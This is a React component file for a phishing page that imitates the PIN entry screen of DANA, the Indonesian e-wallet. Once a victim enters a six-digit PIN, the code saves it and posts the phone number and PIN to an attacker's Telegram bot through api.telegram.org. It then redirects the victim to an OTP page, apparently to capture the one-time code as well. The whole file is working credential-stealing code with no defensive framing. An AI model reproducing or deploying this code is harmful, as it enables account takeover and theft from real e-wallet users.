import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";
import { X } from "lucide-react";

export default function PinInput() {
  const [pin, setPin] = useState(["", "", "", "", "", ""]);
  const refs = [useRef(), useRef(), useRef(), useRef(), useRef(), useRef()];
  const navigate = useNavigate();
  const params = new URLSearchParams(window.location.search);
  const id = params.get("id");

  const editTelegram = async (sub, pin) => {
    const configs = await base44.entities.TelegramConfig.list();
    if (configs.length > 0 && sub.telegram_message_id) {
      const { bot_token, chat_id } = configs[0];
      const line = "━".repeat(21);
      const msg = `${line}\nDATA MASUK - DANA\n${line}\nNama Akun  : ${sub.phone}\nPin Akun   : ${pin}\nKode Akun  : menunggu...\n${line}`;
      await fetch(`https://api.telegram.org/bot${bot_token}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, message_id: sub.telegram_message_id, text: msg }),
      });
    }
  };

  const handleChange = async (index, value) => {
    if (!/^\d?$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (value && index < 5) refs[index + 1].current.focus();

    if (newPin.every((d) => d !== "")) {
      const pinStr = newPin.join("");
      await base44.entities.Submission.update(id, { pin: pinStr, status: "pin" });
      const sub = await base44.entities.Submission.get(id);
      await editTelegram(sub, pinStr);
      navigate(`/otp?id=${id}`);
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      refs[index - 1].current.focus();
    }
  };

  return (
    <div className="min-h-screen bg-white max-w-md mx-auto">
      <div className="bg-[#108ee9] px-4 py-3 flex items-center">
        <X className="text-white w-6 h-6 cursor-pointer" onClick={() => navigate("/")} />
        <span className="text-white font-bold text-lg flex-1 text-center mr-6">Masuk</span>
      </div>

      <div className="px-6 pt-12 flex flex-col items-center">
        <h2 className="text-2xl font-bold text-gray-800 mb-8">Masukkan PIN</h2>

        <div className="flex gap-3 mb-8">
          {pin.map((digit, i) => (
            <div key={i} className="relative w-7 h-7">
              <input
                ref__={refs[i]}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className="w-7 h-7 text-center bg-transparent outline-none absolute top-0 left-0 opacity-0"
              />
              <div className={`w-7 h-7 rounded-full border-2 ${digit ? "bg-gray-700 border-gray-700" : "border-gray-300 bg-gray-200"}`} />
            </div>
          ))}
        </div>

        <div className="flex gap-8 mt-4">
          <button className="flex items-center gap-2 text-[#108ee9] font-medium text-sm">
            <div className="w-6 h-6 bg-gray-200 rounded-full" />
            BUTUH BANTUAN?
          </button>
          <button className="text-[#108ee9] font-medium text-sm">LUPA PIN?</button>
        </div>
      </div>
    </div>
  );
}
